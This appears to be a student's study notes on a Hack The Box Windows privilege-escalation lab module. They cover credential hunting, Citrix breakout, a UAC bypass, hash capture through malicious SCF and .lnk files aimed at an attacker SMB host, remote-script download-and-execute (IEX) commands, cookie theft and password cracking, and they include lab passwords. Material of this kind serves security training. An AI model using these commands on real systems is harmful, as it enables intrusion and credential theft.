Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword

- Decrypting PowerShell Credentials
PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb> $credential.GetNetworkCredential().username
PS C:\htb> $credential.GetNetworkCredential().password

## Exercise 
- Follow sections (from ##  Application Configuration Files)
- Additionals: 
	- starting path be aware, C:\Users seems pretty good, C:\ is the safest bet but often will have too much files to look at. 
	- Look out for xml files. 
	- dir *Folder_to_interested* /AD /s /b for search folder, it searches from the current folder we are at. 
```

#### Other Files
```
## overview
- There are many other types of files that we may find on a local system or on network share drives that may contain credentials or additional information that can be used to escalate privileges. 
 
	-> In an Active Directory environment, we can use a tool such as [Snaffler](https://github.com/SnaffCon/Snaffler) to crawl network share drives for interesting file extensions such as `.kdbx`, `.vmdk`, `.vdhx`, `.ppk`, etc.
	
	-> We may find a virtual hard drive that we can mount and extract local administrator password hashes from, an SSH private key that can be used to access other systems, or instances of users storing passwords in Excel/Word Documents, OneNote workbooks, or even the classic `passwords.txt` file.
	 
	-> I have performed many penetration tests where a password found on a share drive or local drive led to either initial access or privilege escalation. Many companies provide each employee with a folder on a file share mapped to their user id, i.e., the folder `bjones` on the `users` share on a server called `FILE01` with loose permissions applied (i.e., all Domain Users with read access to all user folders). 
	
	-> We often find users saving sensitive personal data in these folders, unaware they are accessible to everyone in the network and not just local to their workstation.

## Manually Searching the File System for Credentials

- We can search the file system or share drive(s) manually using the following commands from [this cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#search-for-a-file-with-a-certain-filename)

- Search File Contents for String - Example 1
C:\htb> cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt

- Search File Contents for String - Example 2
C:\htb> findstr /si password *.xml *.ini *.txt *.config

- Search File Contents for String - Example 3
C:\htb> findstr /spin "password" *.*

- Search File Contents with PowerShell
PS C:\htb> select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password

- Search for File Extensions - Example 1
C:\htb> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
- Start at C:\ directory/directory you want

- Search for File Extensions - Example 2
C:\htb> where /R C:\ *.config

- Search for File Extensions Using PowerShell
PS C:\htb> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore

## Sticky Notes Passwords

- People often use the StickyNotes app on Windows workstations to save passwords and other information, not realizing it is a database file. 
 
	-> This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

- Looking for StickyNotes DB Files
PS C:\htb> ls C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite

- We can copy the three `plum.sqlite*` files down to our system and open them with a tool such as [DB Browser for SQLite](https://sqlitebrowser.org/dl/) and view the `Text` column in the `Note` table with the query `select Text from Note;`.

- Viewing Sticky Notes Data Using PowerShell
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process

[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

PS C:\htb> cd .\PSSQLite\
PS C:\htb> Import-Module .\PSSQLite.psd1
PS C:\htb> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\htb> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap

- Strings to View DB File Contents
strings plum.sqlite-wal

## Other Files of Interest

- Other Interesting Files
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*

## Question
- Follow exactly as in section (## Sticky Notes Passwords)
	-> Always do at least two times before confirming it didn't work. 
```

#### Further Credential Theft
```
## Overview
- There are many other techniques we can use to potentially obtain credentials on a Windows system. 
 
	-> This section will not cover every possible scenario, but we will walk through the most common scenarios.
	
## Cmdkey Saved Credentials
- The [cmdkey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) command can be used to create, list, and delete stored usernames and passwords.
 
	-> Users may wish to store credentials for a specific host or use it to store credentials for terminal services connections to connect to a remote host using Remote Desktop without needing to enter a password. 
	
	-> This may help us either move laterally to another system with a different user or escalate privileges on the current host to leverage stored credentials for another user.

- Listing Saved Credentials
C:\htb> cmdkey /list

- Run Commands as Another User
PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"

## Browser Credentials
- Users often store credentials in their browsers for applications that they frequently visit. 
 
	-> We can use a tool such as [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies and saved logins from Google Chrome.

- Retrieving Saved Credentials from Chrome
PS C:\htb> .\SharpChrome.exe logins /unprotect

## Password Managers

- Many companies provide password managers to their users. This may be in the form of a desktop application such as `KeePass`, a cloud-based solution such as `1Password`, or an enterprise password vault such as `Thycotic` or `CyberArk`.
 
	-> Gaining access to a password manager, especially one utilized by a member of the IT staff or an entire department, may lead to administrator-level access to high-value targets such as network devices, servers, databases, etc.
	
	-> We may gain access to a password vault through password reuse or guessing a weak/common password. Some password managers such as `KeePass` are stored locally on the host.
	
	-> If we find a `.kdbx` file on a server, workstation, or file share, we know we are dealing with a `KeePass` database which is often protected by just a master password.
	
	-> If we can download a `.kdbx` file to our attacking host, we can use a tool such as [keepass2john](https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py) to extract the password hash and run it through a password cracking tool such as [Hashcat](https://github.com/hashcat) or [John the Ripper](https://github.com/openwall/john).

- Extracting KeePass Hash
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 

- Cracking Hash Offline
hashcat -m 13400 keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt

## Email

- If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool [MailSniper](https://github.com/dafthack/MailSniper).

## More Fun with Credentials

- When all else fails, we can run the [LaZagne](https://github.com/AlessandroZ/LaZagne) tool in an attempt to retrieve credentials from a wide variety of software. 
 
	-> Such software includes web browsers, chat clients, databases, email, memory dumps, various sysadmin tools, and internal password storage mechanisms (i.e., Autologon, Credman, DPAPI, LSA secrets, etc.). 
	
	-> The tool can be used to run all modules, specific modules (such as databases), or against a particular piece of software (i.e., OpenVPN). 
	
	-> The output can be saved to a standard text file or in JSON format. 
	
	-> Let's take it for a spin.

- Viewing LaZagne Help Menu
PS C:\htb> .\lazagne.exe -h

- Running All LaZagne Modules
PS C:\htb> .\lazagne.exe all

## Even More Fun with Credentials

- We can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials.
 
	-> The tool is written in PowerShell and searches for and decrypts saved login information for remote access tools. It can be run locally or remotely.
	
	-> It searches the `HKEY_USERS` hive for all users who have logged into a domain-joined (or standalone) host and searches for and decrypts any saved session information it can find. 
	
	-> It can also be run to search drives for PuTTY private key files (.ppk), Remote Desktop (.rdp), and RSA (.sdtid) files.

- Running SessionGopher as Current User
PS C:\htb> Import-Module .\SessionGopher.ps1
 
PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01

## Clear-Text Password Storage in the Registry

- Certain programs and windows configurations can result in clear-text passwords or other data being stored in the registry. 
 
	-> While tools such as `Lazagne` and `SessionGopher` are a great way to extract credentials, as penetration testers we should also be familiar and comfortable with enumerating them manually.

- Windows AutoLogon
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

- Enumerating Autologon with reg.exe
C:\htb>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

**`Note:`** If you absolutely must configure Autologon for your windows system, it is recommended to use Autologon.exe from the Sysinternals suite, which will encrypt the password as an LSA secret.

- Putty
Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>

- Enumerating Sessions and Finding Credentials:
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

## Wifi
- If we obtain local admin access to a user's workstation with a wireless card, we can list out any wireless networks they have recently connected to.

- Viewing Saved Wireless Networks
C:\htb> netsh wlan show profile

- Retrieving Saved Wireless Passwords
C:\htb> netsh wlan show profile ilfreight_corp key=clear

## Questions
- Follow directly from section
	-> Use lazagne.exe
	-> Use cmdkey 
	-> Use SharpChrome.exe
	-> Use SessionGopher
```

## Restricted Environment
#### Citrix Breakout
```
## Overview
	- Numerous organizations leverage virtualization platforms such as Terminal Services, Citrix, AWS AppStream, CyberArk PSM and Kiosk to offer remote access solutions in order to meet their business requirements. 
	
	 -> However, in most organizations "lock-down" measures are implemented in their desktop environments to minimize the potential impact of malicious staff members and compromised accounts on overall domain security. 
	 
	 -> While these desktop restrictions can impede threat actors, there remains a possibility for them to "break-out" of the restricted environment.

- Basic Methodology for break-out:

1. Gain access to a `Dialog Box`.
2. Exploit the Dialog Box to achieve `command execution`.
3. `Escalate privileges` to gain higher levels of access.

## Bypassing Path Restrictions
- Access `C:\Users` has been disallowed
- Run `Paint` from start menu and click on `File` > Open to open the Dialog box

- Enter `\\127.0.0.1\c$\users\pmorgan` under File name field, with file type set to `All Files` and upon hitting we gain access to the desired directory

## Accessing SMB share from restricted environment
smbserver.py -smb2support share $(pwd)

- Go back to Citrix environment and input UNC path as 
\\10.13.38.95\share

- Due to the presence of restrictions within the File Explorer, direct file copying is not viable. 
 
	-> Nevertheless, an alternative approach involves `right-clicking` on the executables and subsequently launching them. 
	
	-> Right-click on the `pwn.exe` binary and select `Open`, which should prompt us to run it and a cmd console will be opened.

- Copy Files from SMB share to pmorgans Desktop directory
	powershell -ep bypass
	cd C:\users\pmorgan\Desktop
	xcopy \\10.13.38.95\share\Bypass-UAC.ps1 .
	xcopy \\10.13.38.95\share\Explorer++.exe .
	xcopy \\10.13.38.95\share\PowerUp.ps1 .
	xcopy \\10.13.38.95\share\pwn.c .
	xcopy \\10.13.38.95\share\pwn.exe .

## Alternate Explorer
- In cases where strict restrictions are imposed on File Explorer, alternative File System Editors like `Q-Dir` or `Explorer++` can be employed as a workaround. 
 
	-> These tools can bypass the folder restrictions enforced by group policy, allowing users to navigate and access files and directories that would otherwise be restricted within the standard File Explorer environment.

	-> Open file explorer by opening the binary.

## Alternate Registry Editors
- Similarly when the default Registry Editor is blocked by group policy, alternative Registry editors can be employed to bypass the standard group policy restrictions. [Simpleregedit](https://sourceforge.net/projects/simpregedit/), [Uberregedit](https://sourceforge.net/projects/uberregedit/) and [SmallRegistryEditor](https://sourceforge.net/projects/sre/) are examples of such GUI tools that facilitate editing the Windows registry without being affected by the blocking imposed by group policy. 
 
	-> These tools offer a practical and effective solution for managing registry settings in such restricted environments.

## Modify existing shortcut file
- Unauthorized access to folder paths can also be achieved by modifying existing windows shortcuts and setting a desired executable's path in the Target field.
	1. Right-clicked on the desired shortcut
	2. Select Properties
	3. Within the Target field, modify the path to the intended folder for access (e.g. `C:\Windows\System32\cmd.exe`)
	4. Execute the shortcut and the cmd will be spawned.

- In case where an existing shortcut file is unavailable, there are alternative methods to consider:
	- One option is to transfer existing shortcut file using an SMB server
	- Alternatively we can create a new shortcut file using PowerShell as mentioned in [Interacting with Users section](https://academy.hackthebox.com/module/67/section/630) under `Generating a Malicious .lnk File`

## Script Execution
- When script extensions such as `.bat`, `.vbs`, or `.ps` are configured to automatically execute their code using their respective interpreters, it opens the possibility of dropping a script that can serve as an interactive console or facilitate the download and launch of various third-party applications which results into bypass of restrictions in place.
 
	-> This situation creates a potential security vulnerability where malicious actors could exploit these features to execute unauthorized actions on the system.
	
	1. Open a new text file and name it "evil.bat"
	2. Open "evil.bat" with a text editor such as Notepad
	3. Input the command "cmd" into the File
	4. Save the file

## Escalating Privileges
- Once access to the command prompt is established, it's possible to search for vulnerabilities in a system more easily. 
 
	-> For instance, tools like [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) can also be employed to identify potential security issues and vulnerabilities within the operating system.

C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

PS C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1
PS C:\Users\pmorgan\Desktop> Write-UserAddMSI

backdoor:T3st@123 under administrator group

C:\> runas /user:backdoor cmd

## Bypassing UAC

- Even though the newly established user `backdoor` is a member of `Administrators` group, accessing the `C:\users\Administrator` directory remains unfeasible due to the presence of User Account Control (UAC). 
 
	-> UAC is a security mechanism implemented in Windows to protect the operating system from unauthorized changes. 
	
	-> With UAC, each application that requires the administrator access token must prompt the end user for consent.

C:\Windows\system32> cd C:\Users\Administrator

PS C:\Users\Public> powershell -ep bypass
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep

-> UAC bypassed

## Questions
Q1: Submit the user flag from C:\Users\pmorgan\Downloads
- Follow setions
	-> Ref from  ## Bypassing Path Restrictions to ## Accessing SMB share from restricted environment
	-> more C:\Users\pmorgan\Downloads\flag.txt
Q2: Submit the Administrator's flag from C:\Users\Administrator\Desktop
- Follow sections
	-> Ref from  ## Escalating Privileges to ## Bypassing UAC
	- Escalating Privileges to bypassing UAC 
	- more C:\Users\Administrator\Desktop\flag.txt
```

## Additional Techniques

#### interacting with Users
```
## Overview
- Users are sometimes the weakest link in an organization. An overloaded employee working quickly may not notice something is "off" on their machine when browsing a shared drive, clicking on a link, or running a file. 
 
	-> As discussed throughout this module, Windows presents us with an enormous attack surface, and there are many things to check for when enumerating local privilege escalation vectors. 
	
	-> Once we have exhausted all options, we can look at specific techniques to steal credentials from an unsuspecting user by sniffing their network traffic/local commands or attacking a known vulnerable service requiring user interaction.
	
	-> One of my favorite techniques is placing malicious files around heavily accessed file shares in an attempt to retrieve user password hashes to crack offline later.
	
## Traffic Capture

- If `Wireshark` is installed, unprivileged users may be able to capture network traffic, as the option to restrict Npcap driver access to Administrators only is not enabled by default.

## Process Command Lines
- When getting a shell as a user, there may be scheduled tasks or other processes being executed which pass credentials on the command line.
 
	-> We can look for process command lines using something like this script below. 
	
	-> It captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.

- Monitoring for Process Command Lines
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
- Named as procmon.ps1

- Running Monitor Script on Target Host
PS C:\htb> IEX (iwr 'http://10.10.10.205/procmon.ps1') 

## Vulnerable Services

- We may also encounter situations where we land on a host running a vulnerable application that can be used to elevate privileges through user interaction. [CVE-201915752](https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e) is a great example of this.
 
	-> This was a vulnerability in Docker Desktop Community Edition before 2.1.0.1. 
	
	-> When this particular version of Docker starts, it looks for several different files, including `docker-credential-wincred.exe`, `docker-credential-wincred.bat`, etc., which do not exist with a Docker installation. The program looks for these files in the `C:\PROGRAMDATA\DockerDesktop\version-bin\`. 
	
	-> This directory was misconfigured to allow full write access to the `BUILTIN\Users` group, meaning that any authenticated user on the system could write a file into it (such as a malicious executable).

## SCF on a File Share

- A Shell Command File (SCF) is used by Windows Explorer to move up and down directories, show the Desktop, etc.
 
	-> An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed.
	
	-> If we change the IconFile to an SMB server that we control and run a tool such as [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh), or [InveighZero](https://github.com/Kevin-Robertson/InveighZero), we can often capture NTLMv2 password hashes for any users who browse the share. 
	 
	-> This can be particularly useful if we gain write access to a file share that looks to be heavily used or even a directory on a user's workstation.
	 
	-> We may be able to capture a user's password hash and use the cleartext password to escalate privileges on the target host, within the domain, or further our access/gain access to other resources.

- Malicious SCF Filenamed as @Inventory.scf
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop

- Starting Responder
sudo responder -w -v -I tun0

Note: In our example, wait 2-5 minutes for the "user" to browse the share after starting Responder.

## Capturing Hashes with a Malicious .lnk File
- Using SCFs no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious [.lnk](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943) file.
 
	-> We can use various tools to generate a malicious .lnk file, such as [Lnkbomb](https://github.com/dievus/lnkbomb), as it is not as straightforward as creating a malicious .scf file. 
	
	-> We can also make one using a few lines of PowerShell:

- Cracking NTLMv2 Hash with Hashcat
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt

- Generating a Malicious .lnk File
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()

Extra notes (on wpad)
- The **Web Proxy Auto-Discovery (WPAD) Protocol** is a method used by clients to locate the URL of a configuration file using [DHCP](https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol "Dynamic Host Configuration Protocol") and/or [DNS](https://en.wikipedia.org/wiki/Domain_Name_System "Domain Name System") discovery methods

## Questions
- Follow the sections in ##O verview to find a writable share (with accessEnum) and write it there.
- Rest is direct follow up from section (##Capturing Hashes with a Malicious .lnk File or ## SCF on a File Share with responder running)

xfreerdp +bitmap-cache /network:auto /dynamic-resolution /compression-level:2 /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.43.43 /tls-seclevel:0 /timeout:80000
 
certutil -urlcache -split -f "http://10.10.16.6:8000/AccessEnum.zip" 

can write it public shares

$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\Department Shares\Public\IT\legit.lnk")
$lnk.TargetPath = "\\10.10.16.6\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

#### Pillaging
```
## Overview
- Pillaging is the process of obtaining information from a compromised system. 
 
	-> It can be personal information, corporate blueprints, credit card data, server information, infrastructure and network details, passwords, or other types of credentials, and anything relevant to the company or security assessment we are working on.

- These data points may help gain further access to the network or complete goals defined during the pre-engagement process of the penetration test. 
 
	-> This data can be stored in various applications, services, and device types, which may require specific tools for us to extract.


## Data Sources
- Below are some of the sources from which we can obtain information from compromised systems:

	- Installed applications
	- Installed services
	    - Websites
	    - File Shares
	    - Databases
	    - Directory Services (such as Active Directory, Azure AD, etc.)
	    - Name Servers
	    - Deployment Services
	    - Certificate Authority
	    - Source Code Management Server
	    - Virtualization
	    - Messaging
	    - Monitoring and Logging Systems
	    - Backups
	- Sensitive Data
	    - Keylogging
	    - Screen Capture
	    - Network Traffic Capture
	    - Previous Audit reports
	- User Information
	    - History files, interesting documents (.doc/x,.xls/x,password._/pass._, etc)
	    - Roles and Privileges
	    - Web Browsers
	    - IM Clients

- This is not a complete list. 

	-> Anything that can provide information about our target will be valuable. 
	
	-> Depending on the business size, purpose, and scope, we may find different information.
	
	-> Knowledge and familiarity with commonly used applications, server software, and middleware are essential, as most applications store their data in various formats and locations.
	
	-> Special tools may be necessary to obtain, extract or read the targeted data from some systems.

## Scenario

- Let's assume that we have gained a foothold on the Windows server mentioned in the below network and start collecting as much information as possible.

## Installed Applications

- Understanding which applications are installed on our compromised system may help us achieve our goal during a pentest. 
 
	-> It's important to know that every pentest is different.
	
	-> We may encounter a lot of unknown applications on the systems we compromised. 
	
	-> Learning and understanding how these applications connect to the business are essential to achieving our goal.

- Identifying Common Applications
C:\>dir "C:\Program Files"

- Get Installed Programs via PowerShell & Registry Keys
PS C:\htb> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

- Discover mRemoteNG Configuration Files
PS C:\htb> ls C:\Users\julio\AppData\Roaming\mRemoteNG

- mRemoteNG Configuration File - confCons.xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
    ..SNIP..
</Connections>

- Decrypt the Password with mremoteng_decrypt
python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 

Password: ASDki230kasd09fk233aDA

- mRemoteNG Configuration File - confCons.xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="1ZR9DpX3eXumopcnjhTQ7e78u+SXqyxDmv2jebJg09pg55kBFW+wK1e5bvsRshxuZ7yvteMgmfMW5eUzU4NG" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="False" 
    
<SNIP>
</Connections>

- Attempt to Decrypt the Password with a Custom Password
python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="
-> ERROR

- Decrypt the Password with mremoteng_decrypt and a Custom Password
python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin

Password: ASDki230kasd09fk233aDA

- For Loop to Crack the Master Password with mremoteng_decrypt
for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    
                              
Spring2017
Spring2016
admin
Password: ASDki230kasd09fk233aDA
admin admin          
admins

- Cookie Extraction from Firefox
	-> Firefox saves the cookies in an SQLite database in a file named `cookies.sqlite`. 
	
	-> This file is in each user's APPDATA directory `%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release`.
	
	-> There's a piece of the file that is random, and we can use a wildcard in PowerShell to copy the file content.

- Copy Firefox Cookies Database
PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .

- Extract Slack Cookie from Firefox Cookies Database
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d

- Modify the value of d cookie to the value of cookie obtained and click save (on the left)

- Refresh the page to see if logged in.
- Repeat the process if it asks for credentials

- Search for common words like words like password, credentials or any other information relavant to our assessment

- PowerShell Script - Invoke-SharpChromium
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"
-> error

- Copy Cookies to SharpChromium Expected Location
PS C:\htb> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"

- Invoke-SharpChromium Cookies Extraction
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"

**Note:** When copy/pasting the contents of a cookie, make sure the value is one line.

## Clipboard

- In many companies, network administrators use password managers to store their credentials and copy and paste passwords into login forms. As this doesn't involve `typing` the passwords, keystroke logging is not effective in this case. 
 
	-> The `clipboard` provides access to a significant amount of information, such as the pasting of credentials and 2FA soft tokens, as well as the possibility to interact directly with the RDP session clipboard.

- Monitor the Clipboard with PowerShell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')

- Capture Credentials from the Clipboard with Invoke-ClipboardLogger
PS C:\htb> Invoke-ClipboardLogger

**Note:** User credentials can be obtained with tools such as Mimikatz or a keylogger. C2 Frameworks such as Metasploit contain built-in functions for keylogging.

## Roles and Services

- Services on a particular host may serve the host itself or other hosts on the target network. 
 
	-> It is necessary to create a profile of each targeted host, documenting the configuration of these services, their purpose, and how we can potentially use them to achieve our assessment goals. 
	
	-> Typical server roles and services include:

	- File and Print Servers
	- Web and Database Servers
	- Certificate Authority Servers
	- Source Code Management Servers
	- Backup Servers

- Let's take `Backup Servers` as an example, and how, if we compromise a server or host with a backup system, we can compromise the network.

- restic - Initialize Backup Directory
PS C:\htb> mkdir E:\restic2; restic.exe -r E:\restic2 init

- restic - Back up a Directory
PS C:\htb> $env:RESTIC_PASSWORD = 'Password'
PS C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder

- restic - Back up a Directory with VSS
PS C:\htb> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshots

**Note:** If the user doesn't have the rights to access or copy the content of a directory, we may get an Access denied message. The backup will be created, but no content will be found.

- restic - Check Backups Saved in a Repository
PS C:\htb> restic.exe -r E:\restic2\ snapshots

- restic - Restore a Backup with ID
PS C:\htb> restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore

**Note:** restic works similarly in Linux. If we don't know where restic snapshots are saved, we can look in the file system for a directory named snapshots. Keep in mind that the environment variable may not be set. If that's the case, we will need to provide a password to restore the files.

## Questions
Q:Access the target machine using Peter's credentials and check which applications are installed. What's the application installed used to manage and connect to remote systems?
- Directly from section (## Installed Applications)
	- Powershell command execution

Q: Find the configuration file for the application you identify and attempt to obtain the credentials for the user Grace. What is the password for the local account, Grace? 
- Directly from section (## Installed Applications on decrypting cookie)
	- Additionals:
		cat C:\Users\peter\AppData\Roaming\mRemoteNG\confCons.xml


		"mRemoteNG" Panel="General" Id="88291c0c-b6b0-4f2d-b180-81d3b50485a4" Username="grace" Domain="PILLAGING-WIN01" Password="s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ="
		
		python3 mremoteng_decrypt.py -s "s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ="
		-> Princess01!

Q: Log in as Grace and find the cookies for the slacktestapp.com website. Use the cookie to log in into slacktestapp.com from a browser within the RDP session and submit the flag.
- Follow section (## Abusing Cookies to Get Access to IM Clients)
	xfreerdp +bitmap-cache /network:auto /dynamic-resolution /compression-level:2 /u:Grace /p:'Princess01!' /v:10.129.203.122 /tls-seclevel:0 /timeout:80000
	
	python -m http.server
	
